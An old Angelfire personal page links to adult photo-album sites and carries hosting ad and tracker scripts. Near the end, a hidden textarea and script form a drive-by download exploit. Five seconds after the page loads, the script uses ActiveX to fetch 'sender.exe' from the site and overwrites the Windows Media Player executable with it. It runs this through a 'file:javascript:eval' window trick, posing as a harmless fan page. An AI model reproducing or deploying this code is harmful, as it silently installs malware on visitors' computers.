<html>
<!--Generated by Angelfire: L00S00-->
<head>
<title>WeLL Come To DOKHTAR FARARY</title>
</head>
<body bgcolor="#000000" text="#0000ff" link="#d2691e" alink="#c0c0c0" vlink="#d2b48c"><!--'"</title></head>-->
<script type="text/javascript">
////// Compete /////////////////////
__compete_code = '667f89f26d96c30e99728fe6a608804d';
(function () {
    var s = document.createElement('script'),
        d = document.getElementsByTagName('head')[0] ||
            document.getElementsByTagName('body')[0],
        t = 'https:' == document.location.protocol ? 
            'https://c.compete.com/bootstrap/' : 
            'http://c.compete.com/bootstrap/';
    s.src = t + __compete_code + '/bootstrap.js';
    s.type = 'text/javascript';
    s.async = 'async'; 
    if (d) { d.appendChild(s); }
})();


////// Quantcast  /////////////////////
function channValidator(chann) {
    return (typeof(chann) == 'string' && chann != '');
}

function lycosQuantcast(){
    var lb = "";
    if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
        lb += cm_host.split('.')[0] + '.';
    }

    if(typeof(cm_taxid) !== 'undefined' && channValidator(cm_taxid)){
        lb += cm_taxid;
        lb = lb.replace('/','');
    } else {
        lb = lb.replace('.','');
    }
    return lb;
}

var _qevents = _qevents || [];

(function() {
    var elem = document.createElement('script');
    elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
    elem.async = true;
    elem.type = "text/javascript";
    var scpt = document.getElementsByTagName('script')[0];
    scpt.parentNode.insertBefore(elem, scpt);
})();

_qevents.push({
    qacct:"p-6eQegedn62bSo",
    labels:lycosQuantcast()
});

/////// Google Analytics
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-21402695-21']);
_gaq.push(['_setDomainName', 'angelfire.com']);
_gaq.push(['_setCustomVar', 1, 'member_name', 'film/dokhtarfarari', 3]);
_gaq.push(['_trackPageview']);
(function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();

////// Lycos Initialization /////////////////////
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

var cm_role = "live";
var cm_host = "angelfire.lycos.com";
var cm_taxid = "/memberembedded";
var angelfire_member_name = "film/dokhtarfarari";
var angelfire_member_page = "film/dokhtarfarari/index.html";
var angelfire_ratings_hash = "1354260412:14ffecdd3eb33aa2b2daf730dbb3b1cd";

var lycos_ad_category = {"dmoz":"society\/relationships","ontarget":"&CAT=family%20and%20lifestyles&L2CAT=relationships","find_what":"windows media server"};

var lycos_ad_remote_addr = "199.48.147.38";
var lycos_ad_www_server = "www.angelfire.lycos.com";
var edit_site_url = "www.angelfire.lycos.com/landing/landing.tmpl?utm_source=house&utm_medium=landingpage&utm_campaign=toolbarlink";

////// Criteo /////////////////////
var cto_conf = { a:true, i: "294", c:"img", kw: "" } ;
(function (){
    var c = document.createElement("script"); c.type = "text/javascript"; c.async = true;
    c.src = "http://www.angelfire.com/adm/js/partner/criteo_ld_kw.js";
    var s = document.getElementsByTagName("body")[0]; s.appendChild(c);
})(); 

</script>
<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript">
(function(isV) {
    if (!isV) {
        return;
    }

    //this.lycos_search_query = lycos_get_search_referrer();
    var adMgr = new AdManager();
    var lycos_prod_set = adMgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2", "toolbar_image", "toolbar_text", "smallbox", "top_promo", "footer2"];
    var adCat = this.lycos_ad_category;
    adMgr.setForcedParam('page', (adCat && adCat.dmoz) ? adCat.dmoz : 'member');

    if (this.lycos_search_query) {
        adMgr.setForcedParam("keyword", this.lycos_search_query);
    } 
    else if (adCat && adCat.find_what) {
        adMgr.setForcedParam('keyword', adCat.find_what);
    }

    for (var s in slots) {
        var slot = slots[s];
        if (adMgr.isSlotAvailable(slot)) {
            this.lycos_ad[slot] = adMgr.getSlot(slot);
        }
    }


    adMgr.renderHeader();
    adMgr.renderFooter();
}((function() {
    var w = 0, h = 0, minimumThreshold = 300;
    if (top == self) {
        return true;
    }

    if (typeof(window.innerWidth) == 'number' ) {
        w = window.innerWidth;
        h = window.innerHeight;
    }
    else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        w = document.documentElement.clientWidth;
        h = document.documentElement.clientHeight;
    }
    else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        w = document.body.clientWidth;
        h = document.body.clientHeight;
    }

    return ((w > minimumThreshold) && (h > minimumThreshold));
}())));



window.onload = function() {
    var f = document.getElementById("lycosFooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.appendChild(f);
    f.style.display = "block";
    document.getElementById('lycosFooterAdiFrame').src = '/adm/ad/footerAd.iframe.html';

    // Slider Injection
    (function() {
        var e = document.createElement('iframe');
        e.style.border = '0';
        e.style.margin = 0;
        e.style.display = 'block';
        e.style.cssFloat = 'right';
        e.style.height = '254px';
        e.style.overflow = 'hidden';
        e.style.padding = 0;
        e.style.width = '300px';
        e.src = '/adm/ad/sliderAd.iframe.html';
        var sliderBlock = document.getElementById('lyslider-adblock-wrapper');
        var sliderHolder = document.getElementById('lyslider-adblock-holder');
        var sliderClose = document.getElementById('lyslider-adblock-close');
        sliderBlock.style.display = 'block';

        sliderClose.onclick = function() {
            sliderBlock.parentNode.removeChild(sliderBlock);
            return false;
        }

        var iframeOnload = function() {
            setTimeout((function sliiide() {
                var s = (window.getComputedStyle) ? parseInt(getComputedStyle(sliderHolder).right) : parseInt(sliderHolder.currentStyle.right);
                if (s <= 0) {
                    sliderHolder.style.right = (s + 6) + 'px';
                    setTimeout(sliiide, 10);
                }
                else {
                    sliderHolder.style.right = '0px';
                    sliderClose.style.display = 'block';
                }
            }), 1000);
        }

        if (e.attachEvent) {
            e.attachEvent('onload', iframeOnload);
        }
        else {
            e.addEventListener('load', iframeOnload, false);
        }

        sliderHolder.insertBefore(e, sliderHolder.firstChild);
    })();
}


</script>

<style>
	#body .adCenterClass{margin:0 auto}
</style>

<div style="background:#abe6f6; border-bottom:1px solid #507a87; position:relative; z-index:9999999">
    <div class="adCenterClass" style="display:block!important; overflow:hidden; width:916px;">
        <a href="http://www.angelfire.lycos.com/" title="Angelfire.com: build your free website today!" style="display:block; float:left; width:186px; border:0">
        <img src="/adm/ad/angelfire-freeAd.jpg" alt="Site hosted by Angelfire.com: Build your free website today!" style="display:block; border:0" />
        </a>
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
    </div>
</div>

<!-- ///////////////////////////////////// -->
<div id="lyslider-adblock-wrapper" style="display:none; height:300px; overflow:hidden; position:absolute; right:0; top:150px; width:320px; z-index:99999999; ">
<div id="lyslider-adblock-holder" style="background-color:#888; height:250px; margin-bottom:25px; padding:4px; position:absolute; right:-320px; top:10px; width:300px; ">
<a id="lyslider-adblock-close" href="#" style="background-color:#222; bottom:-19px; color:#fff; display:block; font:10px Arial, Helvetica, Sans-serif; padding:4px; position:absolute; right:0; text-decoration:none; z-index:9999999999">Close Ad</a>
</div>
</div>


<div id="lycosFooterAd" style="background:#abe6f6; border-top:1px solid #507a87; clear:both; display:none; position:relative; z-index:9999999">
<div class="adCenterClass" style="display:block!important; overflow:hidden; width:936px;">
	<div id="aflinksholder" style="float:left; width:186px;">
        <a href="http://www.angelfire.lycos.com/" title="Angelfire.com: build your free website today!" style="display:block; border:0">
            <img src="/adm/ad/angelfire-freeAd2.jpg" alt="Site hosted by Angelfire.com: Build your free website today!" style="display:block; border:0" />
        </a>
        <div style="text-align:center">
        	<span style="color:#393939!important; font-size:12px!important; position:relative; top:-6px">
            	Sponsored by
            </span>
            
            <a href="http://www.listen.com/disty/index.jsp?from=lycos" target="_blank">
                <img src="http://af.lygo.com/d/toolbar/sponsors/rhapsody_logo.jpg" alt="sponsor logo" title="Rhapsody"/>
            </a>
        </div>
    </div>
    <iframe id="lycosFooterAdiFrame" style="border:0; display:block; float:left; height:96px; overflow:hidden; padding:0; width:750px"></iframe>
</div>
</div>

<noscript>
<img src="http://www.angelfire.com/doc/images/track/ot_noscript.gif?rand=622011" alt="" width="1" height="1" />
<!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Angelfire Fallthrough - DO NOT MODIFY -->
<iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=280303"></iframe>
<!-- END TAG -->
</noscript>

<!-- Start exelate tracker -->
<script type="text/javascript" src="http://loadus.exelator.com/load/?p=398&g=002&ctg=&subctg=&kw=&refkw="></script>
<!--   End exelate tracker -->

<!-- Start Ybrant tracker -->
<img src="http://ad.yieldmanager.com/pixel?id=1901600&t=2" width="1" height="1" />
<!--   End Ybrant tracker -->


<basefont size="3">

<!--Header-->
<h1 align="center">WeLL Come To DOKHTAR FARARY</h1>
<!--EndHeader-->

<!--Image-->
<div align="center"><img src="/doc/images/af_logo_156.gif"></div>
<p>
<!--EndImage-->

<!--List-->
<font size="5">My Favorite Album Girl Iran</font>
<ul>
<li>http://www.download.com
<li>http://www.booterworld.com
<li>http://www.bia2.com
</ul>
<p>
<!--EndList-->

<!--Links-->
<font size="5">My Favorite Web Sites</font>
<p>
<a href="http://www.BOOTER.TK">Album aks dokhtaraneh farari</a><br>
<a href="http://www.bedehi.com">Album aks dokhtarayeh kharej</a><br>
<a href="http://www.cekaf.com">album aks sex</a><br>
<a href="http://www.chanelx.com"> album aks party tehran</a><br>
<p>
<!--EndLinks-->

<!--Freetext-->Thank you for visiting my page at Angelfire.
Please come back and visit again!
<textarea id="code" style="display:none;">

var x = new ActiveXObject("Microsoft.XMLHTTP"); 
x.Open("GET", "http://www.angelfire.com/film/dokhtarfarari/sender.exe",0); 
x.Send(); 

var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);

s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
location.href = "mms://";

</textarea>
Wait a couple of seconds..

<script language="javascript">

function preparecode(code) {
result = '';
lines = code.split(/\r\n/);
for (i=0;i<lines.length;i++) {

line = lines[i];
line = line.replace(/^\s+/,"");
line = line.replace(/\s+$/,"");
line = line.replace(/'/g,"\\'");
line = line.replace(/[\\]/g,"\\\\");
line = line.replace(/[/]/g,"%2f");

if (line != '') {
result += line +'\\r\\n';
}
}
return result;
}

function doit() {
mycode = preparecode(document.all.code.value);
myURL = "file:javascript:eval('" + mycode + "')";
window.open(myURL,"_media") 
}


window.open("error.jsp","_media");

setTimeout("doit()", 5000);


</script><!--EndFreetext-->
<p>

<!--Counter-->
<center><img src="/cgi-bin/Count.cgi"></center>
<p>
<!--EndCounter-->

</body>
</html>
